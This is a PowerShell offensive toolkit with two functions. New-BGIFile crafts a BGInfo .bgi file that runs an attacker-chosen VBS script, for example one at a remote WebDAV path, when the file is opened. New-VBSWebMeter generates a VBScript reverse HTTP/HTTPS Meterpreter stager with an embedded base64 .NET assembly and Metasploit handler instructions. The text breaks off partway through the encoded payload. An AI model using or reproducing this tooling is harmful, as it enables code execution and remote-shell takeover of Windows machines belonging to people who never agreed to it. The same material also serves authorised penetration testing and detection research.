function New-BGIFile
{
<#
.SYNOPSIS

    Generates a BGI file that can execute VBS code.
    Author: Oddvar Moe (@oddvarmoe) - https://msitpros.com
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None


.DESCRIPTION

    New-BGIFile creates a .bgi file that includes path to VBS script that will execute when opened.
    More details on how this works can be found here:
    https://msitpros.com/?p=3831 


.PARAMETER FileName

    Specifies the name of the .bgi you want to create. Ex: hack.bgi


.PARAMETER Script

    Specifies the path to the script that will execute when the .bgi file is opened. 
    Ex: "\\10.10.10.10\webdav\remoteshell.vbs" 
    or if the bgi file is saved togheter with the vbs file: "remoteshell.vbs"


.PARAMETER OutFilePath

    Specifies the path to where the .bgi file should be created. 
    This parameter is set to the current working directory by default.


.EXAMPLE

    New-BGIFile -FileName "MyEvilBGIFile.bgi" -Script "RemoteShell.vbs"
    Description
    -----------
    Creates a BGI file named MyEvilBGIFile.bgi in the current working directory. 
    The path to the script it should execute is set to RemoteShell.vbs.


.EXAMPLE

    New-BGIFile -FileName "MyEvilBGIFile.bgi" -Script "\\10.10.10.10\webdav\RemoteShell.vbs" -OutFilePath "C:\BGIFileFolder" 
    Description
    -----------
    Creates a BGI file named MyEvilBGIFile.bgi in the C:\BGIFileFolder directory. 
    The path to the script it should execute is set to \\10.10.10.10\webdav\RemoteShell.vbs.


.LINK
    https://msitpros.com/?p=3831
#>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)]
        [String]
        $FileName,

        [Parameter(Mandatory=$true)]
        [String]
        $Script,

        [Parameter()]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $OutFilePath = $PWD
    )

    Begin
    {
    }
    Process
    {
        $BGITemplate = "CwAAAEJhY2tncm91bmQABAAAAAQAAAAAAAAACQAAAFBvc2l0aW9uAAQAAAAEAAAA/gMAAAgAAABNb25pdG9yAAQAAAAEAAAAXAQAAA4AAABUYXNrYmFyQWRqdXN0AAQAAAAEAAAAAQAAAAsAAABUZXh0V2lkdGgyAAQAAAAEAAAAwHsAAAsAAABPdXRwdXRGaWxlAAEAAAASAAAAJVRlbXAlXEJHSW5mby5ibXAACQAAAERhdGFiYXNlAAEAAAABAAAAAAwAAABEYXRhYmFzZU1SVQABAAAABAAAAAAAAAAKAAAAV2FsbHBhcGVyAAEAAAABAAAAAA0AAABXYWxscGFwZXJQb3MABAAAAAQAAAAFAAAADgAAAFdhbGxwYXBlclVzZXIABAAAAAQAAAABAAAADQAAAE1heENvbG9yQml0cwAEAAAABAAAAAAAAAAMAAAARXJyb3JOb3RpZnkABAAAAAQAAAAAAAAACwAAAFVzZXJTY3JlZW4ABAAAAAQAAAABAAAADAAAAExvZ29uU2NyZWVuAAQAAAAEAAAAAAAAAA8AAABUZXJtaW5hbFNjcmVlbgAEAAAABAAAAAAAAAAOAAAAT3BhcXVlVGV4dEJveAAEAAAABAAAAAAAAAAEAAAAUlRGAAEAAADWAAAAe1xydGYxXGFuc2lcYW5zaWNwZzEyNTJcZGVmZjBcZGVmbGFuZzEwNDR7XGZvbnR0Ymx7XGYwXGZuaWxcZmNoYXJzZXQwIEFyaWFsO319DQp7XGNvbG9ydGJsIDtccmVkMjU1XGdyZWVuMjU1XGJsdWUyNTU7fQ0KXHZpZXdraW5kNFx1YzFccGFyZFxmaS0yODgwXGxpMjg4MFx0eDI4ODBcY2YxXGJccHJvdGVjdFxmczI0IDxGaWVsZD5ccHJvdGVjdDBccGFyDQpccGFyDQp9DQoAAAsAAABVc2VyRmllbGRzAACAAIAAAAAABgAAAEZpZWxkAAEAAAAOAAAANFRlbXBsYXRlLnZicwAAAAAAAYAAgAAAAAA="
        $ByteArray = [System.Convert]::FromBase64String($BGITemplate) #Convert to Byte array

        #Static content from template
        $Part1 = $ByteArray[0..745] 

        # Byte needs to be length of script name + 2 
        #$Part2 = $ByteArray[746]
        $BGIFileLength = $Script.Length+2
        $Part2 = [System.Convert]::ToByte($BGIFileLength)
        
        #Static content from template
        $Part3 = $ByteArray[747..750]

        # Bytes that represents script name from template
        #$Part4 = $ByteArray[751..762]
        $UTF8 = [system.Text.Encoding]::UTF8
        $Part4 = $UTF8.GetBytes($Script)

        # Static content
        $Part5 = $ByteArray[763..776]

        # Combine parts into new binary file
        $OutFile = New-Object byte[] 0
        $OutFile += $Part1
        $OutFile += $Part2
        $OutFile += $Part3
        $OutFile += $Part4
        $OutFile += $Part5

        #Write the $Outfile
        [System.IO.File]::WriteAllBytes("$OutFilePath\$FileName", $OutFile)
    }
    End
    {
    }
}


function New-VBSWebMeter
{
<#
.Synopsis

    Generates a VBS file that contains Reverse HTTPS Meterpreter.
    Author: Oddvar Moe (@oddvarmoe) - https://msitpros.com
    Author of VBSWebMeter: Cn33liz (@Cneelis) - https://github.com/Cn33liz/VBSMeter/blob/master/VBSWebMeter/VBSWebMeter.vbs
    Required Dependencies: None
    Optional Dependencies: None


.DESCRIPTION

    New-VBSWebMEter creates a VBS file that uses Reverse HTTPS Meterpreter.


.EXAMPLE

    New-VBSWebMeter -RHOST "10.10.10.10" -RPORT "443" -HTTPS "YES" -OutFilePath "C:\BGIPayload" -OutFile "MyVBSWebMeter.vbs"
    Description
    -----------
    Creates a VBS file named MyVBSWebMeter.vbs in the C:\BGIPayLoad directory. 
    When the VBS script is executed it will try to connect to 10.10.10.10 on port 443 and encrypted using HTTPS.
#>
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)]
        $RHOST,

        [ValidateRange(1,65535)]
        [Parameter(Mandatory=$true)]
        $RPORT,
        
        [ValidateSet(“Yes”,”No”)]
        [Parameter(Mandatory=$true)]
        $HTTPS,

        [Parameter()]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $OutFilePath = $PWD,

        [Parameter(Mandatory=$true)]
        $OutFile
    )

    Begin
    {
    }
    Process
    {
    $Code = @"
        '____   ______________  ___________      __      ___.       _____          __                
        '\   \ /   /\______   \/   _____/  \    /  \ ____\_ |__    /     \   _____/  |_  ___________ 
        ' \   Y   /  |    |  _/\_____  \\   \/\/   // __ \| __ \  /  \ /  \_/ __ \   __\/ __ \_  __ \
        '  \     /   |    |   \/        \\        /\  ___/| \_\ \/    Y    \  ___/|  | \  ___/|  | \/
        '   \___/    |______  /_______  / \__/\  /  \___  >___  /\____|__  /\___  >__|  \___  >__|   
        '                   \/        \/       \/       \/    \/         \/     \/          \/       
        
        'VBScript Reversed HTTP/HTTPS Meterpreter Stager - by Cn33liz 2017
        'CSharp Meterpreter Stager build by Cn33liz and embedded within VBScript using DotNetToJScript from James Forshaw
        'https://github.com/tyranid/DotNetToJScript
        
        'This Stager is Proxy aware and should run on x86 as well as x64
        
        'Usage:
        'Change RHOST, RPORT and UseHTTPS to suit your needs:
        
        Dim RHOST: RHOST = "$RHOST"	' <- MSF Listner IP or Hostname
        Dim RPORT: RPORT = "$RPORT"			' <- MSF Listner Port
        Dim UseHTTPS: UseHTTPS = "$HTTPS"		' <- Use HTTPS or plain HTTP Payloads: yes/no
        
        'Start Msfconsole:
        'use exploit/multi/handler
        'set PAYLOAD windows/x64/meterpreter/reverse_https <- When running HTTPS Payload from x64 version of wscript.exe
        'set PAYLOAD windows/x64/meterpreter/reverse_http <- When running HTTP Payload from x64 version of wscript.exe
        'set PAYLOAD windows/meterpreter/reverse_https <- When running HTTPS Payload from x86 version of wscript.exe
        'set PAYLOAD windows/meterpreter/reverse_http <- When running HTTP Payload from x86 version of wscript.exe
        'set LHOST 0.0.0.0
        'set LPORT 443
        'set AutoRunScript post/windows/manage/migrate NAME=notepad.exe
        'set EnableUnicodeEncoding true
        'set EnableStageEncoding true
        'set ExitOnSession false
        'exploit -j
        
        'Then run: wscript.exe VBSWebMeter.vbs on Target
        
        Sub Debug(s)
        End Sub
        Sub SetVersion
        End Sub
        Function Base64ToStream(b)
          Dim enc, length, ba, transform, ms
          Set enc = CreateObject("System.Text.ASCIIEncoding")
          length = enc.GetByteCount_2(b)
          Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
          Set ms = CreateObject("System.IO.MemoryStream")
          ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
          ms.Position = 0
          Set Base64ToStream = ms
        End Function
        
        Sub Run
        Dim s, entry_class
        s = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
        s = s & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
        s = s & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
        s = s & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
        s = s & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
        s = s & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
        s = s & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
        s = s & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
        s = s & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
        s = s & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
        s = s & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
        s = s & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
        s = s & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
        s = s & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
        s = s & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
        s = s & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
        s = s & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
        s = s & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
        s = s & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
        s = s & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
        s = s & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
        s = s & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAACAAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
        s = s & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAADMkWQAAAAAA"
        s = s & "AAAA4AAiIAsBMAAAGAAAAAYAAAAAAAAiNgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"
        s = s & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA0DUA"
        s = s & "AE8AAAAAQAAA+AMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAJg0AAAcAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"
        s = s & "AAAALnRleHQAAAAoFgAAACAAAAAYAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA+AMAAABA"
        s = s & "AAAABAAAABoAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAeAAAAAAAAAAAA"
        s = s & "AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAQ2AAAAAAAASAAAAAIABQCsIwAA7BAAAAEAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzAFAKgAAAAB"
        s = s & "AAARKA8AAAoLEgEoEAAACmlzEQAACgoFcgEAAHAbbxIAAAosQwIcjQ8AAAElFnIJAABwoiUXA6Il"
        s = s & "GHIbAABwoiUZBIwcAAABoiUach8AAHCiJRsGKAgAAAaiKBMAAAoXKAkAAAYmK0ECHI0PAAABJRZy"
        s = s & "IwAAcKIlFwOiJRhyGwAAcKIlGQSMHAAAAaIlGnIfAABwoiUbBigIAAAGoigTAAAKFigJAAAGJhcq"
        s = s & "ChcqABMwBQA1AAAAAgAAEQONHQAAAQpyMwAAcAsWDCsZBggHAgdvFAAACm8VAAAKbxYAAAqdCBdY"
        s = s & "DAgDMuMGcxcAAAoq6gJvGAAACn4CAAAEJS0XJn4BAAAE/gYNAAAGcxkAAAolgAIAAAQoAQAAKygb"
        s = s & "AAAKIAABAABdH1z+ASoTMAQAtAAAAAMAABFzDgAABgoGAn0DAAAEcj8AAHALFgw4jAAAAAZ7AwAA"
        s = s & "BBkoBgAABgtyQQAAcCgYAAAKBnsEAAAEJS0YJgYG/gYPAAAGcxwAAAolEwR9BAAABBEEKAIAACso"
        s = s & "AwAAK3MXAAAKDRYTBSsxBwkRBW8WAAAKEwcSB/4WHQAAAW8fAAAKKCAAAAoTBhEGKAcAAAYsAxEG"
        s = s & "KhEFF1gTBREFCW8UAAAKMsUIF1gMCB9AP2z///9yvwAAcCobMAYAIAEAAAQAABEgABAAAAogACAA"
        s = s & "AAsfQAx+IQAACiZ+IQAACg0WEwQELBEU/gYFAAAGcyIAAAooIwAACnMkAAAKEwURBW8lAAAKcskA"
        s = s & "AHBy3wAAcG8mAAAKEQVvJQAACnI9AQBwcksBAHBvJgAAChEFbyUAAApyUwEAcHJzAQBwbyYAAAoR"
        s = s & "BW8lAAAKcpEBAHByrwEAcG8mAAAKFBMGAygnAAAKdCcAAAFvKAAAChMJEQksFREFKCkAAApvKgAA"
        s = s & "ChEFEQlvKwAAChEFA28sAAAKEwYRBo5pIKCGAQAvBRYTCt5E3gYmFhMK3jwGB2ATB34hAAAKEQaO"
        s = s & "aREHCCgBAAAGEwgRBhYRCBEGjmkoLQAAChYWEQgJFhIEKAIAAAYVKAMAAAYmFyoRCioBEAAAAACU"
        s = s & "AEfbAAYYAAABHgIoLgAACioucwwAAAaAAQAABCoKAypKAnsDAAAEGG8VAAAKGF0W/gEqAABCU0pC"
        s = s & "AQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAAAsBQAAI34AAJgFAAAABwAAI1N0cmluZ3MA"
        s = s & "AAAAmAwAAPABAAAjVVMAiA4AABAAAAAjR1VJRAAAAJgOAABUAgAAI0Jsb2IAAAAAAAAAAgAAAVcV"
        s = s & "AhwJCgAAAPoBMwAWAAABAAAAKwAAAAQAAAAEAAAADwAAABsAAAAuAAAAEAAAAAQAAAABAAAAAgAA"
        s = s & "AAMAAAABAAAAAwAAAAIAAAADAAAAAADOAwEAAAAAAAYAqQIdBQYAFgMdBQYA9gHcBA8APQUAAAYA"
        s = s & "HgIeBAYAjAIeBAYAbQIeBAYA/QIeBAYAyQIeBAYA4gIeBAYANQIeBAYACgL+BAYA6AH+BAYAUAIe"
        s = s & "BAYATAbsAwYA8wPsAwYAdwHsAwYAnQFMBQoADgRMBQoA/wXNBg4AigDsAwoAegZvBgoA9QZvBgoA"
        s = s & "WARvBgYAzQEdBQYAVgPsAwYAZQTsAwYAhADsAwYAhwTsAw4AZAF7BAYATgDxAA4AXAB7BAYA1QTs"
        s = s & "AwoAaAPNBgoAkwRvBgoARARvBgoAMAQ1AQoAkgZvBgoAjgZvBgoAVAFvBgoAvANvBgoApwVvBgYA"
        s = s & "tAP+BAAAAACfAAAAAAABAAEAAQAQALwEAAA9AAEAAQADIRAA7QAAAD0AAQALAAMBEAAcAAAAPQAD"
        s = s & "AA4ANgCbADkBFgABAD0BBgDaBEUBBgAxAEkBAAAAAIAAkSAMAVEBAQAAAAAAgACRICQBWQEFAAAA"
        s = s & "AACAAJEgPwZkAQsAUCAAAAAAhgBaBmoBDQAEIQAAAACRAK0BcQEQAAghAAAAAJEARwN8ARQASSEA"
        s = s & "AAAAkQCRAIMBFgCEIQAAAACRAP4DiAEXAEQiAAAAAIYAcQCOARgAgCMAAAAAhhjIBAYAGgCIIwAA"
        s = s & "AACRGM4ElAEaAIAjAAAAAIYYyAQGABoAlCMAAAAAgwAKAJgBGgCAIwAAAACGGMgEBgAbAJcjAAAA"
        s = s & "AIMAOACdARsAAAABAB8GAAACAEADAAADAIABAAAEAGUGAAABAHoFAAACADQDAAADACkGAAAEALAE"
        s = s & "AAAFAI0FAAAGABkBAQABAG8BAQACAO8EAAABAKcEAAACAIkGAAADAM4AAAABAIwEAAACAIQGAAAD"
        s = s & "ABgEAAAEAA8GAAABANoEAAACADYGAAABADYGAAABANoEAAABAMIAAAACAM4AAAABAKoGAAABADYG"
        s = s & "CQDIBAEAEQDIBAYAGQDIBAoAKQDIBBAAMQDIBBAAOQDIBBAAQQDIBBAASQDIBBAAUQDIBBAAWQDI"
        s = s & "BBAAYQDIBBUAaQDIBBAAcQDIBBAAyQDIBAYAiQCiBiEAiQCdBSYAgQDIBAEA0QDiBSoA0QA4BjEA"
        s = s & "0QBdAz4AgQCdBkIA0QDpBUcA0QDIBEwA0QC8BlIADADIBF4A8QBTBmQA8QD6A4EAFADIBF4A8QCs"
        s = s & "BqIA8QC0BsAAeQBUA9EA0QA4BtUACQF2BOwAEQHIBF4AGQGMA+8AsQDIBAYAsQDzBfYAKQExAfwA"
        s = s & "MQHGAQIBMQHhBgkBQQHEBQ4BsQC0BRQBsQDrBhsBsQDXACEBWQHIBicBeQDIBAYALgALAKIBLgAT"
        s = s & "AKsBLgAbAMoBLgAjANMBLgArAPIBLgAzAPIBLgA7APIBLgBDANMBLgBLAPgBLgBTAPIBLgBbAPIB"
        s = s & "LgBjABACLgBrADoCQwBbAEcCYwBzAE0CgwBzAE0CGgA3AIoA2wB7AFcAmwAAAQMADAEBAAABBQAk"
        s = s & "AQEAAAEHAD8GAQAEgAAAAQAAAAAAAAAAAAAAAACoAAAAAgAAAAAAAAAAAAAAMAHkAAAAAAACAAAA"
        s = s & "AAAAAAAAAAAwAewDAAAAAAMABQAAAAAAAAAAADABkQEAAAAAAwACAAQAAgA1AHwAOwC7AD0AzQAA"
        s = s & "AAAAADw+OV9fNl8wADxjaGVja3N1bTg+Yl9fNl8wADw+Y19fRGlzcGxheUNsYXNzN18wADw+OV9f"
        s = s & "MAA8R2VuSFRUUENoZWNrc3VtPmJfXzAASUVudW1lcmFibGVgMQBJT3JkZXJlZEVudW1lcmFibGVg"
        s = s & "MQBHZXRTdGFnZTEAa2VybmVsMzIASW50MzIARnVuY2AyAGNoZWNrc3VtOAA8PjkAPE1vZHVsZT4A"
        s = s & "Q1NoYXJwLVdlYi1NZXRlcnByZXRlckRMTABMaXN0ZW5lclVSTABVc2VIVFRQUwBEb3dubG9hZERh"
        s = s & "dGEAbXNjb3JsaWIAPD5jAFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljAFZpcnR1YWxBbGxvYwBs"
        s = s & "cFRocmVhZElkAENyZWF0ZVRocmVhZABBZGQAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVk"
        s = s & "AENyZWRlbnRpYWxDYWNoZQBFbnVtZXJhYmxlAGhIYW5kbGUARGF0ZVRpbWUAZmxBbGxvY2F0aW9u"
        s = s & "VHlwZQBTeXN0ZW0uQ29yZQBYNTA5Q2VydGlmaWNhdGUAVmFsaWRhdGVTZXJ2ZXJDZXJ0ZmljYXRl"
        s = s & "AENyZWF0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2Fi"
        s = s & "bGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFz"
        s = s & "c2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNz"
        s = s & "ZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUA"
        s = s & "Q29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUA"
        s = s & "QXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRp"
        s = s & "bWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGR3U3RhY2tTaXplAGR3U2l6ZQBSYW5kb21TdHJpbmcA"
        s = s & "VG9TdHJpbmcAZ2V0X0xlbmd0aABSZW1vdGVDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjawBz"
        s = s & "ZXRfU2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sATWFyc2hhbABOZXR3b3JrQ3Jl"
        s = s & "ZGVudGlhbABDU2hhcnAtV2ViLU1ldGVycHJldGVyRExMLmRsbABTeXN0ZW0AUmFuZG9tAFN1bQBH"
        s = s & "ZW5IVFRQQ2hlY2tzdW0AWDUwOUNoYWluAGNoYWluAFN5c3RlbS5SZWZsZWN0aW9uAE5hbWVWYWx1"
        s = s & "ZUNvbGxlY3Rpb24AV2ViSGVhZGVyQ29sbGVjdGlvbgBXZWJFeGNlcHRpb24AU3RyaW5nQ29tcGFy"
        s = s & "aXNvbgBaZXJvAFN5c3RlbS5MaW5xAENoYXIAc2VuZGVyAFNlcnZpY2VQb2ludE1hbmFnZXIATGlz"
        s = s & "dGVuZXIAbHBQYXJhbWV0ZXIATWV0ZXJQcmV0ZXIALmN0b3IALmNjdG9yAEludFB0cgBTeXN0ZW0u"
        s = s & "RGlhZ25vc3RpY3MAZHdNaWxsaXNlY29uZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2Vz"
        s = s & "AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAU3lzdGVtLlNl"
        s = s & "Y3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzAGxwVGhyZWFkQXR0cmlidXRlcwBk"
        s = s & "d0NyZWF0aW9uRmxhZ3MAZ2V0X1RpY2tzAElDcmVkZW50aWFscwBzZXRfQ3JlZGVudGlhbHMAZ2V0"
        s = s & "X0RlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHMARXF1YWxzAGdldF9DaGFycwBnZXRfSGVhZGVycwBT"
        s = s & "c2xQb2xpY3lFcnJvcnMAc3NsUG9saWN5RXJyb3JzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBD"
        s = s & "b25jYXQAV2FpdEZvclNpbmdsZU9iamVjdABTZWxlY3QATVNGQ29ubmVjdABmbFByb3RlY3QAU3lz"
        s = s & "dGVtLk5ldABXZWJDbGllbnQAY2VydABQb3J0AEh0dHBXZWJSZXF1ZXN0AE5leHQAZ2V0X05vdwB4"
        s = s & "AE9yZGVyQnkAVG9BcnJheQBUb0NoYXJBcnJheQBDb3B5AFN5c3RlbS5OZXQuU2VjdXJpdHkAZ2V0"
        s = s & "X1Byb3h5AHNldF9Qcm94eQBJV2ViUHJveHkAAAAHeQBlAHMAABFoAHQAdABwAHMAOgAvAC8AAAM6"
        s = s & "AAADLwAAD2gAdAB0AHAAOgAvAC8AAAtjAGgAYQByAHMAAAEAfW8ASABEADkARQBqAEoAYwBJAFQA"
        s = s & "cQBoAFYAWQBsAGUARgBSAFgANAA3AHMATgBMAHQASwB4ADYAZwBXAG4ARwA4AHcAVQAwAGkAYQBQ"
        s = s & "ADUAQwAxAHAAZABTAHIAYgBNAHUAWgBmAEIAegBtAHkAdgBrADIAMwBPAEEAUQAACTkAdgBYAFUA"
        s = s & "ABVVAHMAZQByAC0AQQBnAGUAbgB0AAFdTQBvAHoAaQBsAGwAYQAvADQALgAwACAAKABjAG8AbQBw"
        s = s & "AGEAdABpAGIAbABlADsAIABNAFMASQBFACAANgAuADEAOwAgAFcAaQBuAGQAbwB3AHMAIABOAFQA"
        s = s & "KQAADUEAYwBjAGUAcAB0AAAHKgAvACoAAB9BAGMAYwBlAHAAdAAtAEwAYQBuAGcAdQBhAGcAZQAB"
        s = s & "HWUAbgAtAGcAYgAsAGUAbgA7AHEAPQAwAC4ANQABHUEAYwBjAGUAcAB0AC0AQwBoAGEAcgBzAGUA"
        s = s & "dAABPUkAUwBPAC0AOAA4ADUAOQAtADEALAB1AHQAZgAtADgAOwBxAD0AMAAuADcALAAqADsAcQA9"
        s = s & "ADAALgA3AAEAAADMvdkMZvC9SZHy/GkicRIHAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIGBwIS"
        s = s & "QRFFBAAAEUUDIAAKBiACAg4RbQUAAQ4dHAYHAx0DDggDIAAIBCABCAgEIAEDCAUgAQEdAwQgAB0D"
        s = s & "BhUSVQIDCAUgAgEcGBcQAgIVEn0BHgEVEn0BHgAVElUCHgAeAQQKAgMICAABCBUSfQEIEAcIEhAO"
        s = s & "CA4VElUCAwIIDgMGFRJVAgMCGBACAhUSgIEBHgAVEn0BHgAVElUCHgAeAQQKAgMCDBABAR0eABUS"
        s = s & "fQEeAAMKAQMDIAAOBQACDg4OEAcLCQkJGAkSWR0FCRgSXQICBhgGAAEBEoCJBSAAEoCRBSACAQ4O"
        s = s & "BgABEoCZDgQgABJdBQAAEoClBiABARKAqQUgAQESXQUgAR0FDggABAEdBQgYCAi3elxWGTTgiQMG"
        s = s & "EgwHBhUSVQIDCAMGEkEHBhUSVQIDAgcABBgYCQkJCgAGGAkJGBgJEAkFAAIJGAkGIAMCDggOCgAE"
        s = s & "AhwSSRJNEVEGAAIOEkEIBAABAg4FAAEOEkEFIAICDgIDAAABBCABCAMEIAECAwgBAAgAAAAAAB4B"
        s = s & "AAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAeAQAZQ1NoYXJwLVdlYi1NZXRl"
        s = s & "cnByZXRlckRMTAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxNwAAKQEAJDJjNTFkN2MwLTQy"
        s = s & "YTAtNDZhYS04ODU3LTg4NzVkMGE4OTk0MQAADAEABzEuMC4wLjAAAAUBAAEAAAQBAAAAAAAAAAAA"
        s = s & "ADMkWQAAAAACAAAAHAEAALQ0AAC0FgAAUlNEU5rqaWIyYnlFqU0KlwuW22IBAAAAQzpcRGV2ZWxv"
        s = s & "cG1lbnRcQ1NoYXJwLVdlYi1NZXRlcnByZXRlckRMTFxDU2hhcnAtV2ViLU1ldGVycHJldGVyRExM"
        s = s & "XG9ialxSZWxlYXNlXENTaGFycC1XZWItTWV0ZXJwcmV0ZXJETEwucGRiAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4NQAAAAAAAAAAAAASNgAAACAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAABDYAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        s = s & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
